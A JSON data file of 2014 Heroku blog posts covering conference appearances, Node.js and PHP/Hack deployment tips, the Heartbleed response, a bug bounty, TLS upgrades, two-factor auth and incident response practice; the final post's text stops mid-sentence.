{"website": "Heroku", "title": "SxSW Starts Today!", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/sxsw_today", "abstract": "SxSW Starts Today! Posted by Sara Dornsife March 07, 2014 Listen to this article SxSW Interactive starts today. The crowds have arrived, the sessions have begun, and the ExactTarget Orange Oasis is open. Please stop by and say hello at the Heroku purple pavilion there, or schedule a private meeting or demo . Check out the SXSW Fitbit Leaderboard from ExactTarget while you are here. This Heroku app logs and tracks your steps at SxSW. You can join the Leaderboard by logging into Fitbit, and sending a mail to fitbit@exacttarget.com . Also join us for the Heroku SxSW meetup on Sun from 5 - 8p. We'll have food, a haiku poetry slam, and drinks. Have a great (and safe) SxSW, and hope to see you there. \nThe Heroku Team", "date": "2014-03-07,"},
{"website": "Heroku", "title": "10 Habits of a Happy Node Hacker", "author": ["Zeke Sikelianos"], "link": "https://blog.heroku.com/node-habits", "abstract": "10 Habits of a Happy Node Hacker Posted by Zeke Sikelianos March 11, 2014 Listen to this article This post is from 2014 - check out the update! For most of the nearly twenty years since its inception, JavaScript lacked many of the niceties\nthat made other programming languages like Python and Ruby so attractive: command-line interfaces, a\nREPL, a package manager, and an organized open-source community. Thanks in part to Node.js and npm,\ntoday's JavaScript landscape is dramatically improved. Web developers wield powerful\nnew tools, and are limited only by their imagination. What follows is a list of tips and techniques to keep you and your node apps happy. 1. Start new projects with npm init npm includes an init command which walks you through the process of creating a\npackage.json file. Even if you're intimately familiar with package.json and its properties, npm init is a convenient way to get your new node app or\nmodule started on the right track. It sets smart defaults for you, like\ninferring the module name from the parent directory name, reading your author\ninfo from ~/.npmrc , and using your git settings to determine repository . mkdir my-node-app\ncd my-node-app\nnpm init 2. Declare all dependencies It's good to get in the habit of using --save (or --save-dev ) every time you\ninstall a module that's local to your project. These flags add the given module to\nyour package.json's dependencies (or devDependencies ) list and use a\nsensible default semver range . npm install domready --save Notice that npm now uses caret-style semver\nranges : \"dependencies\": {\n  \"domready\": \"^1.0.4\"\n} 3. Specify a start script Setting a value for scripts.start in package.json allows you to start your app\non the command line with npm start . This is a great convention to follow, as\nit allows any node developer to clone your app and get it running easily without\nany guesswork. Bonus: If you define scripts.start in your package.json file, you don't need\na Procfile . A Procfile will be created automatically using npm start as the web\nprocess . Here's an example start script: \"scripts\": {\n  \"start\": \"node index.js\"\n} 4. Specify a test script Just as anyone on your team should be able to run your app, they should also be\nable to test it. The scripts.test field in package.json is used to specify the\nscript to run your test suite. If you're using something like mocha to run\ntests, be sure to include it in devDependencies in package.json, and refer to\nthe binary that's local to your project, rather than the mocha you have\ninstalled globally: \"scripts\": {\n  \"test\": \"mocha\"\n} 5. Keep dependencies out of source control Many node apps use npm modules with C dependencies like bson , ws , and hiredis that must be compiled for Heroku's 64-bit Linux architecture. This\ncompilation step can be a time-consuming process. To keep builds as fast as possible, Heroku's\nnode buildpack caches\ndependencies after they're downloaded and compiled so they can be re-used on subsequent\ndeploys. This cache means reduced network traffic and fewer compiles. Ignoring the node_modules directory is also the npm recommended\npractice for module authors. One less distinction between apps and modules! echo node_modules >> .gitignore 6. Use environment variables to configure npm From the npm config docs: Any environment variables that start with npm_config_ will be interpreted as\na configuration parameter. For example, putting npm_config_foo=bar in your\nenvironment will set the foo configuration parameter to bar . Any environment\nconfigurations that are not given a value will be given the value of true.\nConfig values are case-insensitive, so NPM_CONFIG_FOO=bar will work the same. As of recently, app environment is available in all Heroku\nbuilds . This change gives\nnode users  on Heroku control over their npm configuration without having to\nmake changes to application code. Habit #7 is a perfect example of this\napproach. 7. Bring your own npm registry The public npm registry has seen immense growth in\nrecent years, and with that has come occasional instability. As a result, many\nnode users are seeking alternatives to the public registry, either for the sake\nof speed and stability in the development and build cycle, or as a means to host\nprivate node modules. A number or alternative npm registries have popped up in recent months. Nodejitsu and Gemfury offer paid private\nregistries, and there are some free alternatives such as Mozilla's read-only\nS3/CloudFront mirror and Maciej\nMałecki's European mirror . Configuring your Heroku node app to use a custom registry is easy: heroku config:set npm_config_registry=http://registry.npmjs.eu 8. Keep track of outdated dependencies If you've been programming long enough, you've probably been to dependency\nhell . Fortunately Node.js and npm\nhave set a precedent for sane dependency management by embracing semver, the Semantic Versioning Specification . Under this scheme,\nversion numbers and the way they change convey meaning about the underlying code\nand what has been modified from one version to the next. npm has a little-known command called outdated . Combined with npm update , it's\na great tool for figuring out which of your app's dependencies have fallen behind and\nneed to be updated: cd my-node-app\nnpm outdated\n\nPackage            Current  Wanted     Latest  Location\n-------            -------  ------     ------  --------\nexpress              3.4.8   3.4.8  4.0.0-rc2  express\njade                 1.1.5   1.1.5      1.3.0  jade\ncors                 2.1.1   2.1.1      2.2.0  cors\njade                0.26.3  0.26.3      1.3.0  mocha > jade\ndiff                 1.0.7   1.0.7      1.0.8  mocha > diff\nglob                 3.2.3   3.2.3      3.2.9  mocha > glob\ncommander            2.0.0   2.0.0      2.1.0  mocha > commander If you're working on open-source node apps or modules, check out david-dm , NodeICO , and shields.io , three great\nservices that provide graphical badges you can use to display live dependency info on your project's README or website. 9. Use npm scripts to run custom build steps As the npm ecosystem continues to grow, so do the options for automating the\ndevelopment and build process. Grunt is by far the most\npopular build tool in the node world today, but new tools like gulp.js and plain old npm\nscripts are also attractive\noptions with lighter footprints. When you deploy a node app to Heroku, the npm install --production command is\nrun to ensure your app's npm dependencies are downloaded and installed. But the\ncommand does something else too: It runs any npm script\nhooks that you've defined in your\npackage.json file, such as preinstall and postinstall . Here's a sample: {\n  \"name\": \"my-node-app\",\n  \"version\": \"1.2.3\",\n  \"scripts\": {\n    \"preinstall\": \"echo here it comes!\",\n    \"postinstall\": \"echo there it goes!\",\n    \"start\": \"node index.js\",\n    \"test\": \"tap test/*.js\"\n  }\n} These scripts can be inline bash commands or they can refer to command-line\nexecutables .\nYou can also refer to other npm scripts from within a script: {\n  \"scripts\": {\n    \"postinstall\": \"npm run build && npm run rejoice\",\n    \"build\": \"grunt\",\n    \"rejoice\": \"echo yay!\",\n    \"start\": \"node index.js\"\n  }\n} 10. Try new things Harmony is the working name for ES6, the next edition of the ECMAScript language\nspecification commonly known as JavaScript. Harmony brings lots of exciting new\nfeatures to JavaScript, many of which are already available in newer versions of\nnode. Harmony enables many new features like block\nscoping , generators , proxies , weak\nmaps , etc. To enable harmony features in your node app, specify a newer node engine like 0.11.x and set\nthe --harmony flag in your start script: {\n  \"scripts\": {\n    \"start\": \"node --harmony index.js\"\n  },\n  \"engines\": {\n    \"node\": \"0.11.x\"\n  }\n} 11. Browserify Client-side JavaScript has a spaghetti-code legacy, but the language itself is\nnot to blame. The lack of a legitimate dependency manager is what\nkept us in the jQuery-plugin copy-pasta dark ages for so many years. Thanks to\nnpm, we're entering the front-end renaissance: the npm registry is growing like\ncrazy, and the proliferation of modules designed to work in the browser is\nstaggering. Browserify is an\namazing tool that makes node modules work in the browser. If you're a front-end\ndeveloper, browserify could change your life. Maybe not today, and maybe not\ntomorrow, but soon. To get started using browserify, check out the articles . What are your habits? Whether you've been developing in node for a while or are just getting\nstarted , we\nhope you find these tips useful. If you've got some (healthy) node habits to\nshare, tweet about it with the #node_habits hashtag. Happy hacking! By the way, we're hiring node people ! node npm javascript harmony es6", "date": "2014-03-11,"},
{"website": "Heroku", "title": "Hacking Hack on Heroku", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/hacking_hack_on_heroku", "abstract": "Hacking Hack on Heroku Posted by Craig Kerstiens March 21, 2014 Listen to this article Anytime a new language comes out it’s fun to immediately download it and give it a try . Yesterday Facebook announced Hack , a programming language they developed for HHVM which interoperates seamlessly with PHP . Facebook itself is already running on Hack, and it looks to deliver some exciting improvements from its PHP influence, we thought we’d make it a bit easier for you to run your own apps on Hack by working with them to create a Heroku buildpack . To highlight a few of the awesome things about Hack: Many PHP files are already valid Hack, so you can just start with an existing PHP project Gradual typing, which lets dynamic and statically typed code play well together More language features including: collections, lambdas, and run-time enforcement of return types and parameter types Of course you can read much more about Hack over on Facebook's announcement . Just like everyone else we were excited to see and play with hack. After installing system dependencies and giving Hack a spin we wanted to get it running in production. Throughout this process we had the privilege of spending the afternoon over at Menlo Park with the team, we took advantage of this to make things a little easier we worked with the Hack and HHVM teams to create a HHVM/Hack buildpack that you can try right now. Hack “hello world” Let’s take a try at creating a basic hello world in hack and getting it deployed. First create your index.php as follows: <?hh\n\necho \"Hello from HHVM \".HHVM_VERSION; Then let's create our git repo, add the file, create our Heroku app and deploy away: $ git init .\nInitialized empty Git repository in /tmp/myhackapp/.git/\n$ git add index.php\n$ git commit -m 'initial'\n[master (root-commit) 024f2b1] initial\n 1 file changed, 3 insertions(+)\n create mode 100644 index.php\n$ heroku create --buildpack https://github.com/hhvm/heroku-buildpack-hhvm\nCreating stormy-crag-8213... done, stack is cedar\nBUILDPACK_URL=https://github.com/hhvm/heroku-buildpack-hhvm\nhttp://stormy-crag-8213.herokuapp.com/ | git@heroku.com:stormy-crag-8213.git\n\n… And then we can check and see that it worked: $ heroku open Now you can both easily play with hack and hhvm, and deploy it for sharing and collaborating with others. Give it a try and let us know what you think.", "date": "2014-03-21,"},
{"website": "Heroku", "title": "Heroku at the AWS Summit SF - Wed March 26th", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/aws_summit", "abstract": "Heroku at the AWS Summit SF - Wed March 26th Posted by Sara Dornsife March 24, 2014 Listen to this article AWS Summit SF is coming up on Wed March 26th at Moscone South. We are thrilled to be sponsoring the Developer Lounge. Heroku engineers and staff will be available throughout the day to answer your questions about Heroku; developing Ruby, Python, and Node apps on Heroku; Heroku Postgres; and the architecture of apps using both Heroku and AWS. If you plan on attending, please stop by, say hello, and bring your questions. Or you can just play ping pong. If you would like to set up an appointment for a specific time, please send us an email .", "date": "2014-03-24,"},
{"website": "Heroku", "title": "OpenSSL Heartbleed Security Update", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/openssl_heartbleed_security_update", "abstract": "OpenSSL Heartbleed Security Update Posted by Craig Kerstiens April 08, 2014 Listen to this article Yesterday the OpenSSL Project released an update to address the CVE-2014-0160 vulnerability , nicknamed “Heartbleed.” This serious vulnerability affects a substantial number of applications and services running on the internet, including Heroku. All Heroku users should update their passwords as a precautionary measure. If you are currently running the SSL Endpoint add-on, you should re-key and reissue your certificate and update it as it may have been exposed.  As of Tuesday, April 8 at 15:55 UTC, all Heroku certificates, infrastructure, and Heroku Postgres have been updated and are no longer vulnerable. Continue reading for further details on each affected vector. Vulnerability Details This vulnerability can be remotely exploited to leak encryption secrets from Heroku applications, allowing an attacker to retrieve the private key used for SSL encryption and decode data obtained by intercepting traffic.  Since this vulnerability potentially exposes the private key used for encryption, we strongly advise that you replace both the private key and certificate as soon as possible. Your Heroku Password We encourage all Heroku users to update their Heroku account passwords. We do not have any evidence that passwords have been compromised, but given the amount of time that this vulnerability was in existence the safest thing to do for your account is to rotate your Heroku credentials. You can reset your Heroku password here . Custom Domain SSL We have worked with our infrastructure provider to update OpenSSL on all SSL Endpoints . However, since this vulnerability made it possible for an attacker to compromise a private key for an extended period of time, we strongly suggest that you create a new private key and update your endpoint . Please contact your SSL certificate provider if you have questions about generating a new private key. For customers of our legacy Hostname SSL, please upgrade to the current SSL Endpoint add-on . The *.herokuapp certs have been rekeyed and updated, meaning we sent new certificate requests (CSR) to our CA signed with new private keys, but with the same info. This is why you will not see new dates when checking the cert. Important Note: We advise you to not get your certificate reissued until you are ready to update your endpoint. Once you issue a new private key, your certificate provider may invalidate your previous certificate. Heroku Certificates Since this attack could have potentially exposed our own certificates, we've obtained new certificates for Heroku properties as a precaution. Heroku Postgres All Heroku Postgres instances used the affected version of OpenSSL. This affects the libpq SSL connection, which we require on all Postgres databases to ensure your data is safe. Upon discovery, we rolled out a new version of OpenSSL, then restarted the Postgres process and other processes using OpenSSL. As a result, this update may have resulted in a few seconds of downtime for your database. As an extra precaution, we encourage you to update your database credentials with heroku pg:credentials HEROKU_POSTGRESQL_COLOR --reset Summary As of Tuesday, April 8 at 15:55 UTC, all Heroku certificates, infrastructure, and Heroku Postgres have been updated and are no longer vulnerable to CVE-2014-0160 vulnerability , nicknamed “Heartbleed.” All Heroku users should update their passwords as a precautionary measure. If you are currently running an ssl:endpoint endpoint, you should re-key and update your certificate as your private key or other data may have been exposed. If you are running the legacy SSL hostname add-on, you should migrate to SSL endpoint . While we're confident that all of the aforementioned vectors have been addressed, we are continuing to monitor the situation and have a heightened eye to potential abuse on the Heroku platform. Thank you for your patience while we worked on resolving this issue. As always, please don’t hesitate to let us know if you have any additional questions or concerns.", "date": "2014-04-08,"},
{"website": "Heroku", "title": "PyCon Montreal  - April 9 - 17, 2014", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/pycon_2014", "abstract": "PyCon Montreal  - April 9 - 17, 2014 Posted by Sara Dornsife April 09, 2014 Listen to this article We are really honored to be a part of PyCon again this year. We have a big booth in the expo hall and a bunch of people who are really looking forward to attending and who are there to answer questions, hack on code, troubleshoot, or shoot the …. Enter to win: While you are in our booth, you can enter to win $500 (in cash or credits) toward the open source-related project, user group, meetup, or organization of your choice. Ask at the booth for details. Here’s who is going to be there this weekend: Craig Kerstiens ( @craigkerstiens ) Dave Gouldin @dgouldin ) Dominic Dagradi @dddagradi ) Francis Lacoste ( @fjlacoste ) Greg Stark ( @zkzkz ) Jacob Kaplan-Moss ( @jacobian ) Jamu Kakar ( @jkarak ) Kenneth Reitz ( @kennethreitz ) Leigh Honeywell ( @hypatiadotca ) Matt Zimmerman ( @mdz ) Meagan Gamache ( @mgngmch ) Rhys Elsmore ( @rhyselsmore ) Tammy Contreraz ( @tcontreraz ) Timothée Peignier ( @cyberdelia ) Talks: Wed April 9 @ 3:30 - 5:00pm - Jacob Kaplan-Moss presenting, “Heroku 101 Room 514C Sun April 13 @ 1:10 - 1:50pm - Craig Kerstiens presenting, “Postgres Performance for Humans” Room 517D Please stop by and see us!", "date": "2014-04-09,"},
{"website": "Heroku", "title": "Congratulations to Plated, Zoobean, and Breathometer on Shark Tank", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/customers_shark_tank", "abstract": "Congratulations to Plated, Zoobean, and Breathometer on Shark Tank Posted by Sara Dornsife April 10, 2014 Listen to this article We love seeing our customers’ successful and gaining recognition for the amazing businesses they are building. So, as you could imagine, we were thrilled to learn that a Heroku customer was featured on ABCs Shark Tank last Friday, with two more being featured over the next couple weeks. Plated - Aired 4/4 at 9pm ET on ABC Plated , a New York City-based food/tech company, aims to make it simple and fun for people to create healthy, homemade dinners by delivering fresh ingredients and chef-designed easy-to-follow recipes directly to your door. With delivery now available to 80% of the USA, Plated is likely available to you. After Plated’s launch in November 2012, the company was featured by numerous national publications such as the New York Times, Forbes, and The Wall Street Journal; and was later accepted into the TechStars Spring 2013 New York class. The latest media highlight for Plated’s was being featured on the April 4th episode of Shark Tank. Knowing all too well that stability, reliability, performance and customer experience would be paramount when the show aired, Plated worked closely with Heroku Technical Account Management to gain deep insight and guidance on their applications. Plated made some updates to their app so that when they were on the show they were able to watch knowing their app on Heroku was going to scale and perform as it should. Congratulations to Plated on receiving an investment form Mark Cuban! Zoobean - Airs 4/18 at 9pm ET on ABC Zoobean , based in Washington D.C., curates children's books and apps, then personalizes selections for your child, like Pandora for children's apps and books. The company, started by Chief Mom, Jordan and Chief Dad, Felix,  launched in May of 2013 and has been featured on Fox, NBC, RealSimple and CoolMomTech. Zoobean is a Ruby/Rails app running Heroku Postgres as a Database, Memcachier for caching, New Relic and Librato for application monitoring. The main benefit Felix, Chief Dad, was looking for in a platform was to always have someone on the other end making sure their site was running as expected, especially when the show aired, and with Heroku they had that. They added even more peace of mind by engaging a TAM (Technical Account Manager) and enabling Premium Support. Through this relationship, Heroku and Zoobean, worked on load testing, analysis, adding a CDN, and pre-warming their ssl:endpoint so they are ready for their premier on Shark Tank on Friday April 18th, on ABC. Breathometer - Airs 4/18 at 9pm ET on ABC Breathometer , based in Silicon Valley, turns your smartphone into a breathalyzer within seconds. The Breathometer hardware plugs into your smartphone, accepts your breathe, analyzes your blood alcohol level with software powered by Heroku and shows you the results on your Breathometer smartphone app also powered by Heroku. The company launched in early 2013, has received accolades from CBS, Engadget, Gizmodo, LA Times and accepted an unprecedented $1M investment offer from all five of the ‘sharks’ on ABC’s hit show, Shark Tank. Breathometer is a Ruby/Rails app that uses Unicorn as a webserver with 2X Dynos for added concurrency. Breathometer is running Heroku Postgres and Redis Cloud as their data stores, Papertrail for logging, New Relic for application monitoring along with Blitz and Loader.io for load testing. What’s next for Breathometer? Aside from reducing the 10,000 annual death toll in the US from drunk-driving, it has its eyes (or should we say mouths) on testing glucose levels. A lot of excitement in the coming weeks for a few Heroku customers! Tune into ABC to see how they do!", "date": "2014-04-10,"},
{"website": "Heroku", "title": "Heroku Security Bug Bounty", "author": ["Leigh Honeywell"], "link": "https://blog.heroku.com/security_bug_bounty", "abstract": "Heroku Security Bug Bounty Posted by Leigh Honeywell April 17, 2014 Listen to this article The information in this blog post is out of date . For the latest information about Heroku's bug-bounty program and reporting process, please see our Security Policy page . Security researchers, you can always consult Heroku's security.txt for the latest policy information. Working with security researchers to ensure the trustworthiness of Heroku’s platform is an ongoing effort of ours. As part of this effort, the Heroku security team, in conjunction with Bugcrowd , is pleased to announce our new security bug bounty program. For each security bug you help find, which helps to ensure our platform is safe and secure, we'll reward you. Our initial rewards will be between $100 and $1500, varying based on the severity of the vulnerability. Detailed rules and information about the scope of this bounty program are available on our page at Bugcrowd . As was previously the case, customer applications are strictly out of scope for the bounty – but we’ll pass information along to those customers if you let us know. We will continue to list researchers who report to us on our Hall of Fame , to provide public recognition and thanks for working with us to make our platform more secure. As part of Heroku and our parent company Salesforce.com’s commitment to philanthropy , if you are interested in donating your bounty to a recognized charity we will match it dollar-for-dollar. For any other security inquiries, you can still reach the Heroku security team directly at security@heroku.com ( PGP key ) or by opening a support ticket . security", "date": "2014-04-17,"},
{"website": "Heroku", "title": "Beyond Heartbleed: Improved Security for Encrypted Connections", "author": ["Leigh Honeywell"], "link": "https://blog.heroku.com/beyond_heartbleed_improved_security_for_encrypted_connections", "abstract": "Beyond Heartbleed: Improved Security for Encrypted Connections Posted by Leigh Honeywell April 25, 2014 Listen to this article The announcement earlier this month of the “Heartbleed” bug ( CVE-2014-0160 ) in OpenSSL once again focused attention on the technology used to secure communications on the Internet. Heartbleed was a very serious vulnerability and we moved as quickly as possible to patch systems and eliminate this threat on behalf of our customers. But security is not just about fire drills, there are many steps that can be taken over time to continually improve security. Over the last months we have rolled out several security improvements to Heroku SSL Endpoints , including: Perfect Forward Secrecy TLS 1.1 , 1.2 support Updated ciphers These enhancements have already been rolled out and are in effect for you today if you are running on our Cedar stack and using ssl:endpoint . If you are using the legacy ssl:hostname plan you will need to switch to ssl:endpoint to take advantage of the improvements. With the new changes, your applications on Heroku now use the most up-to-date practices for securing incoming traffic. You can verify this by using an SSL testing tool like SSL Labs from Qualys . You should score at least an “A” using this tool. To get an “A+”, you will need to implement HTTP Strict Transport Security in your application. Our SSL endpoints will pass the appropriate headers through to your users. Perfect Forward Secrecy? While all of these changes are valuable, we want to draw some extra attention to Perfect Forward Secrecy. Imagine that an attacker is able to record the encrypted communication between a client and server for some time. Then at a later point, the attacker manages to steal the private key from the server. Perfect Forward Secrecy ensures this stolen private key cannot be used to decrypt communications from the past. Heartbleed is an example of a bug that can be exploited to steal private keys. Should a similar bug be discovered in the future, you can now rest assured that past communications cannot be decrypted. A Quick Note on BEAST We often get questions about the BEAST attack, as SSL Labs will show it is no longer mitigated on the server side. BEAST is considered to be most effectively mitigated in clients at this point, so we have chosen to prioritize newer ciphers over the BEAST server mitigation. Qualys has an excellent write-up on this this, if you would like to learn more .", "date": "2014-04-25,"},
{"website": "Heroku", "title": "PHP – a look back, a look forward", "author": ["David Zuelke"], "link": "https://blog.heroku.com/php_a_look_back_a_look_forward", "abstract": "PHP – a look back, a look forward Posted by David Zuelke April 29, 2014 Listen to this article The history of PHP is the history of the web. Long-time developers will remember how PHP changed the universe of web development. PHP brought two key innovations to the table when it first launched. First, it was interpreted, which meant you could edit a file in place, then refresh the page and see the result. This quick feedback loop was why so many started with PHP and is still a cornerstone of what makes the language so useful. Second, it was the first widespread templating language which enabled intermixing of HTML and PHP code. Every other major web language and framework since PHP has followed suit. Over time, PHP became a cornerstone of the “LAMP stack”. The LAMP stack consisted of Linux, Apache, MySQL, and PHP, and helped to define the world of open source we all take for granted today. The ubiquity of open-source software in web development is near-absolute now, but it was the success of these technologies that redefined an industry. Of course PHP wasn’t perfect and other languages and their frameworks came along to contend with PHP as the years went by. In fact, Heroku’s founders ran a PHP consultancy called Bitscribe which focused on PHP development before founding Heroku. They eventually moved from PHP on to Ruby on Rails, which led to the creation of Heroku when they discovered that the Rails ecosystem lacked good hosting options. A Modern PHP The best way to get someone to do the right thing is to make it the easiest thing to do. That’s why we’ve built Heroku to support and encourage the best practices of modern software development out of the box. We’ve captured a lot of this experience in the Twelve-Factor App Manifesto , and now we’ve also applied it to our new PHP support on the platform . Here’s a look at just of the few of they ways they apply: The days of live on-server editing along with all the late nights and outages it inevitably leads to are fortunately behind us. Version control is ubiquitous today, and it’s rare to meet a development team not collaborating using a tool like Phabricator or GitHub . Unfortunately, it’s still far too common for system libraries, web servers, and extensions to be mismatched between dev, staging, and production environments. On Heroku, your git integrated deployment pipeline allows you to “git push” to deploy code with confidence whether it’s to your development environment or to production. We’ll use Composer to automatically ensure you get exactly the right version of all your code’s dependencies every time, including configuring either Apache or Nginx, and all your system dependencies. Although many other languages have grown their own rudimentary native web servers, it’s still most common to pair PHP with a dedicated web server. Apache is the most common choice and very well understood, but Nginx is certainly growing in popularity. We support both, and in order to improve dev-prod parity , we’ve built a composer package that lets you, the developer, choose which one you prefer, receive a sensible configuration out-of-the-box, and further configure them with ease whether you’re running on Heroku, your local machine, or anywhere you please. Today and Tomorrow In today's world, PHP developers choose from a huge variety of technology options. These include modern data stores like PostgreSQL, Redis, and MongoDB, front-end frameworks like Angular, and platforms like, of course, Heroku. In fact, for many modern PHP applications the notion of the LAMP stack seems limiting. Fortunately, PHP developers on Heroku can fearlessly take advantage of just about any technology they can imagine. For example, every PHP app on Heroku includes a free PostgreSQL database with support for a wide variety of powerful features like full-text search , and native JSON types . If Postgres isn’t to your liking our add-on marketplace brings the entire ecosystem to your fingertips. If you’ve got a technology need, you’ll probably find just the add-on you’re looking for. One piece of future direction we’re incredibly excited about is Hack . Hack brings a whole host of new developments to PHP. Many PHP developers have heard about HHVM, Facebook’s high performance PHP virtual-machine project. Hack is another project from that team, and it includes great new features like an improved collections library, asynchronous method calls, and even the world’s friendliest type-system - all while supporting vanilla PHP code and enabling you to adopt it incrementally as you discover the features you need. And Hack is available for you to try directly on Heroku today with this new PHP support. We should note though, Hack is quite new, and we encourage you to give it a try, but at this point support for Hack should definitely be considered experimental and we would encourage you to test it thoroughly before putting anything into production. When you put all these pieces together, it’s inarguable: PHP’s future is bright. Hundreds of thousands of PHP developers ship code every day. From Facebook to Etsy to Wordpress: big companies continue to invest in PHP. Between the long-term stewardship of Zend and the new creative energies Facebook’s Hack language have brought to the community, it’s clear that no matter what flavor of PHP you choose there’s an ever more powerful, flexible future… with lots of fast feedback. Whether you’re engineering high-scale mission-critical systems every day or you’re just making things for yourself and your friends, try the new PHP in public beta on Heroku today . Happy making, and welcome to Heroku. php", "date": "2014-04-29,"},
{"website": "Heroku", "title": "Introducing the new PHP on Heroku", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/introducing_the_new_php_on_heroku", "abstract": "Introducing the new PHP on Heroku Posted by Craig Kerstiens April 29, 2014 Listen to this article PHP developers are makers at heart. The core strength of PHP has always been in creating a tight feedback cycle between developers and their audiences. That strength is the reason why PHP powers so many of the world’s biggest and best web properties such as Facebook and Etsy.  But as developers of those and similar apps know, PHP hasn’t always enjoyed some of the runtime, management or infrastructure elements its peer communities like Ruby on Rails, Python with Django, and Node have had for some time. As one of the web’s largest PHP shops, Facebook has been an advocate and innovator for the language, but it’s been hard for PHP developers beyond Facebook’s walls to take advantage of that innovation. We’ve been fortunate to work with Facebook on a variety of occasions, and with their F8 Conference next door to our office here in San Francisco, we thought it would be a great opportunity to help bring some of their and the PHP communities’ latest innovations to developers everywhere, by announcing today full Heroku support for the new PHP. If you are in town for F8, please join us tonight for a pre-conference PHP meetup at our office right next door to the main venue. This new PHP is built on new runtimes and frameworks, marrying the familiarity and productivity of the popular language with the best practices of other modern frameworks – letting PHP developers take their favorite language further than ever. The new PHP is perfectly suited for modern development and deployment Heroku helped create , and is available today. More specifically, Heroku is making available in public beta today: Native HipHop Support At the foundation of the new PHP is Facebook’s HipHop VM, a modern, high-performance runtime for PHP that promises orders of magnitude speed improvements while retaining compatibility.  With help from the Facebook team, this VM is now available as part of the Heroku buildpack , so developers can quickly deploy their PHP code onto this new VM just as they would Rails or Python. Specifying running with the traditional VM or HHVM is now a trivial switch for PHP apps on Heroku. Packaging and First Class Frameworks Declarative and explicit dependency management is a core facet of building apps in this new world. This ensures: A clean development pipeline Ease in onboarding new developers to your project Parity between development and production closer thus making running production apps easier. This form of structured dependency management has been available in other Heroku supported languages for years, and now PHP via Composer has copied the best of breed from all of them. Further the new PHP brings with it many new frameworks such as Symfony and Laravel which bring forward this new type of development. Together dependency management and these newer frameworks help to better deliver apps that can both be brought to market quickly, but also maintained and scaled in a predictable fashion today on Heroku. Heroku XL Support With these enhancements, PHP can take advantage of the benefits Heroku introduced with XL , offering a complete path for companies to deploy and scale PHP in high scale, high performance contexts. PX Dyno compatibility brings even greater performance to PHP apps running on Heroku, and coupling with HHVM support delivers performance for even the highest scale sites. And with premium support for PHP, developers and enterprises both can deploy their PHP apps with the confidence of having 24 x 7 technical resources available to them. Getting Started Enough talk though, let's give it a try. First let’s create our standard hello world application with an index.php file: <?php\n\necho \"Hello World!\";\n\n?> Now we’re going to create our composer.json file, which in this case will be empty because we’re not using any dependencies at all for our application: touch composer.json Finally let’s commit it to git, create our heroku application, and deploy. $ git init\nInitialized empty Git repository in ~/hello_heroku_php/.git/\n$ git add .\n$ git commit -m \"Initial import of Hello Heroku\"\n[master (root-commit) 06ba0a7] Initial import of Hello Heroku\n 2 files changed, 5 insertions(+)\n create mode 100644 composer.json\n create mode 100644 index.php\n$ heroku create \nCreating safe-ridge-5356... done, stack is cedar\nhttp://safe-ridge-5356.herokuapp.com/ | git@heroku.com:safe-ridge-5356.git\n$ git push heroku master\n...\n$ heroku open And now we have a working PHP app. In Conclusion We’d like to thank so much of the community for helping drive so much innovation in PHP, from the creators of Composer to the Facebook team working on HHVM. We look forward to seeing what you build with this new PHP support on Heroku and welcome any feedback or comments as you dig in.", "date": "2014-04-29,"},
{"website": "Heroku", "title": "Two-factor Auth in Public Beta", "author": ["Michael Friis"], "link": "https://blog.heroku.com/two_factor_auth_in_public_beta", "abstract": "Two-factor Auth in Public Beta Posted by Michael Friis May 06, 2014 Listen to this article Today, we’re excited to announce public beta of two-factor authentication for Heroku accounts. With two-factor auth enabled, an authentication code is required whenever you log in. The code is delivered using an app on your smartphone, and access to your phone becomes a required factor (in addition to your password) to access Heroku. An attacker that has somehow discovered your password will not be able to log in using just your password. Enabling two-factor auth The easiest way to enable two-factor auth is using Dashboard. Go to your account page , click the “Enable two-factor authentication” button and follow the on-screen instructions. Download an authenticator app for your smartphone if you don’t already have one. We recommend Google Authenticator but alternatives like Authy work too. Scan the barcode shown on the Dashboard page using the downloaded authentication app. Finally, enter the 6-digit code displayed on your smartphone to enable two-factor authentication. That’s it! Your account is now protected with two-factor auth. In the coming months, we want to add support for sending authentication codes using SMS and we’ll expose two-factor auth support in the Platform API , so stay tuned. At Heroku we care deeply about the security of apps and accounts on the platform. In the past month alone, we responded vigorously to the Heartbleed vulnerability , launched our Security Bug Bounty program and announced important security improvements for SSL endpoints . With two-factor auth enabled, your Heroku account will have an extra layer of security that stops attackers that have somehow discovered your password. Enable it now .", "date": "2014-05-06,"},
{"website": "Heroku", "title": "Incident Response at Heroku", "author": ["Mark McGranaghan"], "link": "https://blog.heroku.com/incident-response-at-heroku", "abstract": "Incident Response at Heroku Posted by Mark McGranaghan May 09, 2014 Listen to this article As a service provider, when things go wrong you try to get them fixed as quickly as possible. In addition to technical troubleshooting, there’s a lot of coordination and communication that needs to happen in resolving issues with systems like Heroku’s. At Heroku we’ve codified our practices around these aspects into an incident response framework. Whether you’re just interested in how incident response works at Heroku, or looking to adopt and apply some of these practices for yourself, we hope you find this inside look helpful. Incident Response and the Incident Commander Role We describe Heroku’s incident response framework below. It’s based on the Incident Command System used in natural disaster response and other emergency response fields. Our response framework and the Incident Commander role in particular help us successfully respond to a variety of incidents. When an incident occurs, we follow these steps: Move to a central chat room. Before starting work on the incident, move to a shared “Platform Incidents” HipChat room. This ensures everyone is on the same page about the initial response. Designate IC. The Incident Commander (“IC”) is the leader of the response effort. The IC doesn’t fix issues directly or communicate personally with customers. Instead they’re responsible for the health of the incident response: ensuring that the right responders are involved, that everyone has the information they need, that all issues are covered, and that incident resolution is proceeding well overall. By default the IC is the first person to notice the problem, but for significant incidents the role is usually transferred to a dedicated IC. Several people at Heroku are specifically trained to be ICs and can be paged into a situation with a HipChat bot: Update public status site . Our customers want information about incidents as quickly as possible, even if it is preliminary. As soon as possible, the IC designates someone to take on the communications role (“comms”) with a first responsibility of updating the status site with our current understanding of the incident and how it’s affecting customers. The admin section of Heroku’s status site helps the comms operator to get this update out quickly: The status update then appears on status.heroku.com and is sent to customers and internal communication channels via SMS, email, and HipChat bot: Send out internal sitrep . Next the IC compiles and sends out the first situation report (“sitrep”) to the internal team describing the incident. It includes what we know about the problem, who is working on it and in what roles, and open issues. As the incident evolves, the sitrep acts as a concise description of the current state of the incident and our response to it. A good sitrep 